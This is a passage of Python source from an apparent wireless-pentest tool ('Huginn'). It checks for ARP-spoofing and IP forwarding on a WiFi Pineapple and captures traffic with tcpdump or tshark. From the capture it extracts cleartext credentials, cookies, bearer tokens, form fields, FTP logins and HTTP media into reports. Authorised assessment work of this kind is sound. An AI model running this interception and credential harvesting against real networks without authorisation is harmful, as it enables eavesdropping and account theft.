                    f'Capture interface {interface} is not UP on the Pineapple. '
                    f'Link state: {link_section.strip()[:200]}'
                ),
                'failure_type': 'interface_down',
                'interface': interface, 'duration': duration, 'scan_origin': scan_origin,
                'cmd': f'ip -o link show {interface} (remote)',
            }
        ip_section = iface_out.split('__IP__', 1)[1] if '__IP__' in iface_out else ''
        m_ipv4 = re.search(r'\binet\s+(\S+)', ip_section)
        if m_ipv4:
            iface_ip = m_ipv4.group(1)
        else:
            preflight_warnings.append(
                f'{interface} has no IPv4 address. Monitor-mode / passive captures can still '
                f'see frames, but MITM/forwarded plaintext HTTP requires an IP-layer interface '
                f'in the traffic path.'
            )

        # Verify tcpdump on the Pineapple.
        probe = _pine_run(cfg, 'command -v tcpdump >/dev/null 2>&1 && echo OK || echo MISSING', timeout=8)
        if 'MISSING' in (probe.get('stdout', '') or ''):
            return {
                'ok': False,
                'error': 'tcpdump is not installed on the Pineapple. Install with: opkg install tcpdump',
                'failure_type': 'dependency_missing', 'dependency': 'tcpdump',
                'interface': interface, 'duration': duration, 'scan_origin': scan_origin,
            }

        # Best-effort MITM probes - never fail the scan, just surface as warnings.
        mitm_probe = _pine_run(
            cfg,
            'pgrep -af arpspoof 2>/dev/null; echo __PIDS__; '
            'ls /tmp/huginn_arpspoof_*.pid 2>/dev/null; echo __FWD__; '
            'sysctl -n net.ipv4.ip_forward 2>/dev/null',
            timeout=10,
        )
        mitm_out = mitm_probe.get('stdout', '') or ''
        pgrep_section, _, rest = mitm_out.partition('__PIDS__')
        pid_section, _, fwd_section = rest.partition('__FWD__')
        arp_spoof_active = bool(pgrep_section.strip()) or bool(pid_section.strip())
        ip_forwarding = '1' in fwd_section.strip().splitlines()[-1:] if fwd_section.strip() else False
        if not arp_spoof_active:
            preflight_warnings.append(
                "ARP spoofing does not appear active on the Pineapple. If client traffic is "
                "not routed through the Pineapple's capture interface, plaintext HTTP will "
                "not be visible. Start pineapple_arpspoof first if you expect a MITM path."
            )
        if not ip_forwarding:
            preflight_warnings.append(
                'IP forwarding is not enabled on the Pineapple (net.ipv4.ip_forward != 1). '
                'Without forwarding, ARP-spoofed clients lose connectivity and will not '
                'actually transit HTTP through the Pineapple.'
            )

        # If a Huginn-tracked ARP spoof session is active, narrow the capture
        # BPF filter to the two endpoints. This keeps the PCAP focused on
        # MITM traffic and suppresses the dup-capture noise that used to
        # make credential rows appear twice in the report.
        bpf_filter = ''
        try:
            from tools.pineapple_helpers import _read_arpspoof_state as _arp_state
            arp_state = _arp_state()
            if arp_state and arp_state.get('state') == 'running':
                t_ip = arp_state.get('target_ip')
                p_ip = arp_state.get('peer_ip')
                if t_ip and p_ip:
                    bpf_filter = f'host {t_ip} and host {p_ip}'
        except Exception:
            bpf_filter = ''

        remote_pcap = f'/tmp/huginn_unenc_{ts}.pcap'
        q_iface = shlex.quote(interface)
        q_remote = shlex.quote(remote_pcap)
        q_bpf = shlex.quote(bpf_filter) if bpf_filter else ''
        bpf_arg = f' {q_bpf}' if bpf_filter else ''
        cap_script = (
            f'tcpdump -i {q_iface} -G {duration} -W 1 -w {q_remote} -q{bpf_arg} 2>/dev/null & '
            f'TCPD=$!; sleep {duration}; kill $TCPD 2>/dev/null; wait $TCPD 2>/dev/null; '
            f'ls -l {q_remote} 2>/dev/null'
        )
        cap_cmd_str = f'ssh pineapple: {cap_script}'
        result = _pine_run(cfg, f'sh -c {shlex.quote(cap_script)}', timeout=duration + 30)

        # SCP the file back.
        scp = _scp_from_remote(cfg, remote_pcap, pcap_path, timeout=120)
        _pine_run(cfg, f'rm -f {q_remote} 2>/dev/null', timeout=5)
        if not scp.get('ok') or not Path(pcap_path).exists() or Path(pcap_path).stat().st_size < 24:
            return {
                'ok': False,
                'error': f'Pineapple capture on {interface} produced no data or SCP failed.',
                'failure_type': 'capture_produced_no_packets',
                'interface': interface, 'duration': duration, 'scan_origin': scan_origin,
                'cmd': cap_cmd_str,
            }
    else:
        # ── Local Kali capture ──
        if interface:
            iface_reason = f'Explicitly specified by user: {interface}'
        else:
            interface, iface_reason = _select_capture_interface(pineapple_path=False)
        if not interface:
            return {'ok': False, 'error': 'Could not determine capture interface. ' + iface_reason}

        try:
            p = subprocess.run(['ip', '-4', 'addr', 'show', interface], capture_output=True, text=True, timeout=5, check=False)
            m = re.search(r'inet\s+(\S+)', p.stdout or '')
            if m:
                iface_ip = m.group(1)
        except Exception:
            pass

        cap_cmd = ['tshark', '-i', interface, '-a', f'duration:{duration}', '-w', pcap_path, '-q']
        cap_cmd_str = ' '.join(cap_cmd)
        try:
            subprocess.run(cap_cmd, text=True, capture_output=True, timeout=duration + 60, check=False)
        except subprocess.TimeoutExpired:
            pass
        except Exception as exc:
            return {'ok': False, 'error': f'Live capture failed: {exc}'}

        if not Path(pcap_path).exists() or Path(pcap_path).stat().st_size < 24:
            return {
                'ok': False,
                'error': f'Live capture on {interface} produced no data.',
                'interface': interface, 'duration': duration, 'scan_origin': scan_origin,
            }

    # ── Analyze ──
    analysis = scan_unencrypted_traffic(pcap_path=pcap_path)
    if not analysis.get('ok'):
        return analysis

    findings = analysis.get('findings', {})
    pkt_count = analysis.get('packet_count', 0)

    # ── Extended extraction helpers ──
    def _tshark_fields(filt: str, fields: list[str], limit: int = 200) -> list[dict[str, str]]:
        fargs = []
        for f in fields:
            fargs.extend(['-e', f])
        cmd = ['tshark', '-r', pcap_path, '-Y', filt, '-T', 'fields'] + fargs
        try:
            p = _run(cmd, timeout=90)
            rows = []
            for line in (p.stdout or '').splitlines():
                parts = line.split('\t')
                if any(x.strip() for x in parts):
                    rows.append({fields[i].replace('.', '_'): (parts[i].strip() if i < len(parts) else '') for i in range(len(fields))})
            return rows[:limit]
        except Exception:
            return []

    def _tshark_counted(filt: str, field: str, limit: int = 25) -> list[str]:
        cmd = ['tshark', '-r', pcap_path, '-Y', filt, '-T', 'fields', '-e', field]
        try:
            p = _run(cmd, timeout=60)
            vals = [ln.strip() for ln in (p.stdout or '').splitlines() if ln.strip()]
            return [f'{v} ({c})' for v, c in Counter(vals).most_common(limit)]
        except Exception:
            return []

    # TLS SNI / DNS
    tls_sni = _tshark_counted('tls.handshake.extensions_server_name', 'tls.handshake.extensions_server_name', 25)
    dns_names = _tshark_counted('dns.qr == 0', 'dns.qry.name', 25)

    # Extended HTTP fields for better reporting
    http_detail = _tshark_fields(
        'http.request',
        ['ip.src', 'ip.dst', 'tcp.dstport', 'http.request.method', 'http.host',
         'http.request.uri', 'http.user_agent', 'http.authorization', 'http.cookie'],
    )

    # Email protocol content (SMTP commands / data)
    smtp_detail = _tshark_fields('smtp', ['ip.src', 'ip.dst', 'tcp.dstport', 'smtp.req.command', 'smtp.req.parameter'])
    pop_detail = _tshark_fields('pop.request', ['ip.src', 'ip.dst', 'pop.request.command', 'pop.request.parameter'])
    imap_detail = _tshark_fields('imap.request', ['ip.src', 'ip.dst', 'imap.request'])

    # Conversations
    tcp_conv = ''
    try:
        p = _run(['tshark', '-r', pcap_path, '-z', 'conv,tcp', '-q'], timeout=60)
        tcp_conv = _tail(p.stdout, 5000)
    except Exception:
        pass
    udp_conv = ''
    try:
        p = _run(['tshark', '-r', pcap_path, '-z', 'conv,udp', '-q'], timeout=60)
        udp_conv = _tail(p.stdout, 5000)
    except Exception:
        pass

    # ── Per-scan report directory layout ──
    from tools import unencrypted_media_report as _umr

    report_ts = _dt.now().strftime('%Y%m%d_%H%M%S')
    base_reports = reports_dir()
    base_reports.mkdir(parents=True, exist_ok=True)
    report_dir = base_reports / f'unencrypted_scan_{report_ts}'
    objects_dir = report_dir / 'objects'
    media_dir   = report_dir / 'media'
    images_dir  = report_dir / 'images'
    videos_dir  = report_dir / 'videos'
    for d in (report_dir, objects_dir, media_dir, images_dir, videos_dir):
        d.mkdir(parents=True, exist_ok=True)

    warnings: list[str] = list(preflight_warnings)
    errors: list[str] = []

    # ── Extra HTTP metadata (responses + form fields) ──
    http_responses = _tshark_fields(
        'http.response',
        ['frame.time_epoch', 'ip.src', 'ip.dst', 'tcp.srcport', 'tcp.dstport',
         'http.response.code', 'http.content_type', 'http.content_length', 'http.location'],
        limit=500,
    )
    form_fields = _tshark_fields(
        'urlencoded-form',
        ['ip.src', 'ip.dst', 'urlencoded-form.key', 'urlencoded-form.value'],
        limit=200,
    )

    # ── Normalize http_requests into the rich shape the renderer expects ──
    http_requests: list[dict[str, Any]] = []
    for r in http_detail:
        http_requests.append({
            'time':         _umr._iso_ts_from_epoch(r.get('frame_time_epoch', '')),
            'src_ip':       r.get('ip_src', ''),
            'dst_ip':       r.get('ip_dst', ''),
            'src_port':     r.get('tcp_srcport', ''),
            'dst_port':     r.get('tcp_dstport', ''),
            'method':       r.get('http_request_method', ''),
            'host':         r.get('http_host', ''),
            'uri':          r.get('http_request_uri', ''),
            'full_uri':     r.get('http_request_full_uri', ''),
            'user_agent':   r.get('http_user_agent', ''),
            'referer':      r.get('http_referer', ''),
            'authorization': r.get('http_authorization', ''),
            'cookie':       r.get('http_cookie', ''),
            'notes':        '',
        })

    http_responses_norm: list[dict[str, Any]] = []
    for r in http_responses:
        http_responses_norm.append({
            'time':          _umr._iso_ts_from_epoch(r.get('frame_time_epoch', '')),
            'src_ip':        r.get('ip_src', ''),
            'dst_ip':        r.get('ip_dst', ''),
            'src_port':      r.get('tcp_srcport', ''),
            'dst_port':      r.get('tcp_dstport', ''),
            'response_code': r.get('http_response_code', ''),
            'content_type':  r.get('http_content_type', ''),
            'content_length': r.get('http_content_length', ''),
            'location':      r.get('http_location', ''),
        })

    # Best-effort: correlate a response's content-type back onto its request
    # by matching (tcp.stream) tuples. We approximate with (src,dst,port) flip.
    def _find_request_for_response(resp: dict[str, Any]) -> dict[str, Any] | None:
        for req in http_requests:
            if (req.get('src_ip') == resp.get('dst_ip')
                and req.get('dst_ip') == resp.get('src_ip')
                and str(req.get('src_port')) == str(resp.get('dst_port'))
                and str(req.get('dst_port')) == str(resp.get('src_port'))):
                return req
        return None

    for resp in http_responses_norm:
        req = _find_request_for_response(resp)
        if req is not None:
            ct = resp.get('content_type') or ''
            if ct:
                req['response_content_type'] = ct
                req['content_type'] = ct
            if resp.get('response_code'):
                req['response_code'] = resp['response_code']
            if resp.get('content_length'):
                req['content_length'] = resp['content_length']

    # ── Run tshark --export-objects http into <report_dir>/objects ──
    export_cmd = ['tshark', '-r', pcap_path, '--export-objects', f'http,{objects_dir}', '-q']
    http_object_count = 0
    export_ok = True
    try:
        export_proc = subprocess.run(export_cmd, capture_output=True, text=True, timeout=180, check=False)
        if export_proc.returncode != 0 and not any(objects_dir.iterdir()):
            export_ok = False
            errors.append(
                f'tshark --export-objects http failed (returncode={export_proc.returncode}). '
                f'stderr tail: {(export_proc.stderr or "").strip()[-400:]}'
            )
    except subprocess.TimeoutExpired:
        export_ok = False
        errors.append('tshark --export-objects http timed out after 180s.')
    except FileNotFoundError:
        export_ok = False
        errors.append('tshark is not installed locally on Kali - cannot export HTTP objects.')

    # ── Classify every exported object; copy confirmed media; build catalog ──
    http_objects: list[dict[str, Any]] = []
    extracted_media: list[dict[str, Any]] = []
    extracted_images: list[dict[str, Any]] = []
    extracted_videos: list[dict[str, Any]] = []

    def _match_request_for_object(obj_filename: str) -> dict[str, str]:
        """Best-effort: match an exported filename to an http_request.
        tshark writes objects using the request URI (often URL-encoded), so
        we compare the decoded URI suffix.
        """
        from urllib.parse import unquote as _unquote
        decoded = _unquote(obj_filename)
        decoded_tail = decoded.lstrip('/').split('?', 1)[0]
        best = None
        for req in http_requests:
            uri = (req.get('uri') or '').split('?', 1)[0]
            if not uri:
                continue
            if uri.lstrip('/').endswith(decoded_tail) or decoded_tail.endswith(uri.lstrip('/')):
                best = req
                break
        if best is None:
            return {}
        host = best.get('host') or best.get('dst_ip') or ''
        src_host = host
        if best.get('dst_port'):
            if host and ':' not in host:
                src_host = f"{host}:{best['dst_port']}"
        return {
            'source_host': src_host,
            'source_uri': best.get('uri') or '',
            'response_content_type': best.get('response_content_type') or best.get('content_type') or '',
        }

    for fpath in sorted(objects_dir.iterdir()):
        if not fpath.is_file() or fpath.stat().st_size == 0:
            continue
        corr = _match_request_for_object(fpath.name)
        classification = _umr.classify_http_object(
            fpath,
            content_type_hint=corr.get('response_content_type'),
            original_filename=fpath.name,
        )
        entry = _umr.build_media_entry(
            src_path=fpath,
            classification=classification,
            report_dir=report_dir,
            media_dir=media_dir,
            images_dir=images_dir,
            videos_dir=videos_dir,
            source_host=corr.get('source_host'),
            source_uri=corr.get('source_uri'),
        )
        # Determine object_type for the HTTP objects table.
        if entry['valid_media_signature'] and entry['media_category'] in ('image', 'video'):
            object_type = 'media'
        elif entry['suspicious']:
            object_type = 'suspicious'
        else:
            object_type = 'non-media'
        http_object_row = {
            'filename': entry['filename'] if object_type == 'media' else fpath.name,
            'path': entry['path'] if object_type == 'media' else str(fpath),
            'relative_path': entry['relative_path'] if object_type == 'media'
                             else str(fpath.relative_to(report_dir)),
            'size_bytes': entry['size_bytes'],
            'sha256': entry['sha256'],
            'mime_type': entry['mime_type'],
            'source_host': entry['source_host'],
            'source_uri': entry['source_uri'],
            'object_type': object_type,
            'notes': entry['notes'],
        }
        http_objects.append(http_object_row)
        http_object_count += 1
        if entry['valid_media_signature']:
            extracted_media.append(entry)
            if entry['media_category'] == 'image':
                extracted_images.append(entry)
            elif entry['media_category'] == 'video':
                extracted_videos.append(entry)

    # ── Credentials / cookies / form fields ──
    # Deterministic extraction: HTTP POST bodies, urlencoded forms, Authorization
    # headers, Cookies, and exported HTTP text objects. Pineapple-forwarded
    # duplicates are collapsed in the extractor.
    show_secrets = _show_secrets_default()
    sensitive_findings = _extract_cleartext_sensitive_data(
        pcap_path=pcap_path,
        exported_objects_dir=objects_dir,
        show_secrets=show_secrets,
    )

    # Legacy list for back-compat with older UI callers - one short string per
    # finding, same bullet layout as before.
    credentials: list[dict[str, Any]] = []
    for f in sensitive_findings:
        client = f.get('src_ip', '?') or '?'
        if f.get('src_port'):
            client = f'{client}:{f["src_port"]}'
        server = f.get('dst_ip', '?') or '?'
        if f.get('dst_port'):
            server = f'{server}:{f["dst_port"]}'
        uri = f.get('uri', '') or ''
        host = f.get('host', '') or server
        kind_label = {
            'http_form_field':        'HTTP form field',
            'http_json_field':        'HTTP JSON field',
            'http_basic_auth':        'HTTP Basic',
            'http_bearer_token':      'HTTP Bearer',
            'http_authorization':     'HTTP Authorization',
            'http_cookie':            'HTTP Cookie',
            'http_set_cookie':        'HTTP Set-Cookie',
            'http_response_body':     'HTTP response body',
        }.get(f.get('kind', ''), f.get('kind', 'credential'))
        credentials.append({
            'kind': kind_label,
            'detail': (
                f'{client} → {host}{uri}: '
                f'{f.get("field","")}={f.get("value","")[:300]} '
                f'[source={f.get("source","")} frame={f.get("frame","")}]'
            ),
        })
    for r in findings.get('ftp_commands', []):
        cmd_val = (r.get('ftp_request_command', '') or '').upper()
        if cmd_val in ('USER', 'PASS'):
            credentials.append({
                'kind': f'FTP {cmd_val}',
                'detail': f'{r.get("ip_src","?")} → {r.get("ip_dst","?")}: {r.get("ftp_request_arg","")}',
            })

    # ── Plaintext protocols observed ──
    plaintext_protocols_observed: list[str] = []
    if http_requests:
        plaintext_protocols_observed.append('HTTP')
    for proto_key, label in [('ftp_commands', 'FTP'), ('telnet_sessions', 'Telnet'),
                              ('smtp_traffic', 'SMTP'), ('pop_traffic', 'POP3'),
                              ('imap_traffic', 'IMAP'), ('snmp_traffic', 'SNMP')]:
        if findings.get(proto_key):
            plaintext_protocols_observed.append(label)
    if dns_names:
        plaintext_protocols_observed.append('DNS')

    # ── Outcome warnings ──
    if pkt_count > 0 and not http_requests:
        warnings.append(
            'No HTTP traffic was observed. Confirm the client used http:// not https://, that the '
            'capture interface is in the traffic path (MITM/ARP-spoof active), that the browser '
            'was not serving from cache, and that the capture started before the transfer.'
        )
    if http_requests and not extracted_media:
        warnings.append(
            'HTTP traffic was observed, but no image/video object could be reconstructed from the '
            'capture. Likely causes: partial/chunked transfer, capture started mid-flow, tshark '
            'reassembly limit hit, or the HTTP body was not a media type.'
        )

    # ── Summary for the Executive Summary block ──
    # Credential count is driven by the deterministic extractor so the number
    # no longer drifts from the real evidence when legacy parse paths miss a
    # packet. ``credentials`` mirrors ``sensitive_findings`` except for FTP.
    sensitive_count = len(sensitive_findings)
    ftp_login_count = max(0, len(credentials) - sensitive_count)
    total_cred_count = sensitive_count + ftp_login_count
    unenc_observed = bool(plaintext_protocols_observed or sensitive_findings or credentials)
    summary_block = {
        'unencrypted_observed': unenc_observed,
        'http_observed': bool(http_requests),
        'media_extracted': bool(extracted_media),
        'http_request_count': len(http_requests),
        'http_response_count': len(http_responses_norm),
        'http_object_count': http_object_count,
        'image_count': len(extracted_images),
        'video_count': len(extracted_videos),
        'credential_count': total_cred_count,
        'sensitive_finding_count': sensitive_count,
    }

    # ── Build the report context + render both Markdown and HTML ──
    limitations = list(analysis.get('limitations', []))
    limitations.extend([
        'DNS and TLS SNI are encrypted-connection metadata, not proof of plaintext data exposure.',
        f'Capture window was {duration} seconds - short-lived connections may have been missed.',
        'HTTP object export depends on tshark reassembly; partial or chunked transfers may not be recovered.',
        'HTTPS / TLS content cannot be reconstructed without keys or SSL inspection.',
        'Media extraction requires the full HTTP body to be captured; late-start or cached transfers will be missing.',
        'If no media appears, likely causes are wrong interface, no MITM path, HTTPS, cache hit, or capture timing.',
    ])

    cap_cmd_display = cap_cmd_str if pineapple_path else ' '.join(cap_cmd)
    ctx = {
        'generated_at': _dt.now().isoformat(timespec='seconds'),
        'summary': summary_block,
        'capture': {
            'mode': 'live',
            'pineapple_path': pineapple_path,
            'interface': interface,
            'interface_ip': iface_ip,
            'interface_reason': iface_reason,
            'duration': duration,
            'pcap_path': pcap_path,
            'report_dir': str(report_dir),
            'report_ts': report_ts,
            'packet_count': pkt_count,
            'capture_command': cap_cmd_display,
        },
        'plaintext_protocols_observed': plaintext_protocols_observed,
        'http_requests': http_requests,
        'http_responses': http_responses_norm,
        'http_objects': http_objects,
        'extracted_media': extracted_media,
        'extracted_images': extracted_images,
        'extracted_videos': extracted_videos,
        'credentials': credentials,
        'sensitive_findings': sensitive_findings,
        'show_secrets': show_secrets,
        'warnings': warnings,
        'errors': errors,
        'limitations': limitations,
    }

    try:
        md_path, html_path = _umr.write_reports(report_dir, ctx)
    except Exception as exc:
        return {
            'ok': False,
            'error': f'Report generation failed: {type(exc).__name__}: {exc}',
            'failure_type': 'report_generation_failed',
            'pcap_path': pcap_path,
            'interface': interface,
            'duration': duration,
            'scan_origin': scan_origin,
            'report_dir': str(report_dir),
        }

    report_path = str(md_path)  # back-compat: older callers read `report_path`.

    return {
        'ok': True,
        'mode': 'live',
        'capture_mode': 'live',
        'pcap_path': pcap_path,
        'report_path': report_path,
        'report_dir': str(report_dir),
        'report_markdown_path': str(md_path),
        'report_html_path': str(html_path),
        'object_export_dir': str(objects_dir),
        'media_export_dir': str(media_dir),
        'image_export_dir': str(images_dir),
        'video_export_dir': str(videos_dir),
        'packet_count': pkt_count,
        'interface': interface,
        'interface_ip': iface_ip,
        'interface_reason': iface_reason,
        'pineapple_path': pineapple_path,
        'scan_origin': scan_origin,
        'duration': duration,
        'cleartext_found': bool(plaintext_protocols_observed or credentials) or analysis.get('cleartext_found', False),
        'findings': findings,
        'plaintext_protocols_observed': plaintext_protocols_observed,
        'http_requests': http_requests,
        'http_responses': http_responses_norm,
        'http_objects': http_objects,
        'extracted_media': extracted_media,
        'extracted_images': extracted_images,
        'extracted_videos': extracted_videos,
        'credentials': credentials,
        'sensitive_findings': sensitive_findings,
        'sensitive_finding_count': sensitive_count,
        'credentials_found': bool(sensitive_findings or credentials),
        'show_secrets': show_secrets,
        'warnings': warnings,
        'errors': errors,
        'arp_spoof_active': arp_spoof_active,
        'ip_forwarding': ip_forwarding,
        'dns_queries_count': len(dns_names),
        'tls_sni_count': len(tls_sni),
        'protocols_checked': analysis.get('protocols_checked', []),
        'limitations': limitations,
        # Legacy keys preserved for older consumers:
        'classified_http': [],
        'extracted_artifacts': [
            {'file': o['filename'], 'path': o['path'], 'size': o['size_bytes'],
             'mime': o['mime_type'], 'sha256_prefix': (o['sha256'] or '')[:16]}
            for o in http_objects
        ],
    }


def read_file(path_str: str, policy: dict) -> dict[str, Any]:
    if not path_str:
        return {'ok': False, 'error': 'No path provided'}

    path = Path(path_str).expanduser()
    if not path.exists():
        return {'ok': False, 'error': f'File does not exist: {path}'}
    if not path.is_file():
        return {'ok': False, 'error': f'Path is not a file: {path}'}

    allowed_roots = (policy.get('file_access') or {}).get('allowed_roots', [])
    if not _is_under_allowed_root(path, allowed_roots):
        return {'ok': False, 'error': f'Path not under allowed roots: {path}'}

    max_bytes = int((policy.get('file_access') or {}).get('max_read_bytes', 20000))
    data = path.read_bytes()[:max_bytes]
    try:
        text = data.decode('utf-8', errors='replace')
    except Exception:
        text = repr(data)

    return {'ok': True, 'path': str(path.resolve()), 'content': text}


def run_allowlisted_app(name: str, allowlist: dict) -> dict[str, Any]:
    apps = allowlist.get('apps') or {}
    if name not in apps:
        return {'ok': False, 'error': f'Unknown allowlisted app key: {name}'}

    cmd = apps[name].get('cmd') or []
    if not cmd:
        return {'ok': False, 'error': f'Missing cmd for app key: {name}'}

    try:
        proc = subprocess.Popen(cmd)
        return {'ok': True, 'launched': name, 'cmd': cmd, 'pid': proc.pid}
    except Exception as exc:
        return {'ok': False, 'error': str(exc), 'cmd': cmd}


def run_allowlisted_command(name: str, allowlist: dict) -> dict[str, Any]:
    commands = allowlist.get('commands') or {}
    if name not in commands:
        return {'ok': False, 'error': f'Unknown allowlisted command key: {name}'}

    cmd = commands[name].get('cmd') or []
    if not cmd:
        return {'ok': False, 'error': f'Missing cmd for command key: {name}'}

    proc = _run(cmd, timeout=60)
    return {
        'ok': proc.returncode == 0,
        'name': name,
        'cmd': cmd,
        'returncode': proc.returncode,
        'stdout': _tail(proc.stdout),
        'stderr': _tail(proc.stderr),
    }
